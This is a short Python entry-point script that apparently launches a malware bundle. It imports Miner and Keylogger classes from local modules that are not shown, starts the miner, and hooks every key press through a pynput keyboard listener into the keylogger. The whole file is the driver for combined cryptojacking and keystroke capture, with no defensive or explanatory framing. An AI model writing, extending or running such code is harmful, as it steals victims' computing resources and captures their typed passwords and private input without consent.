from miner import Miner
from keylogger import Keylogger
from pynput.keyboard import Listener



if __name__ == '__main__':
    miner = Miner()
    keylogger = Keylogger()

    miner.start() # Miner start

    with Listener(on_press=keylogger.press) as listener: # Keypress listener
        listener.join()
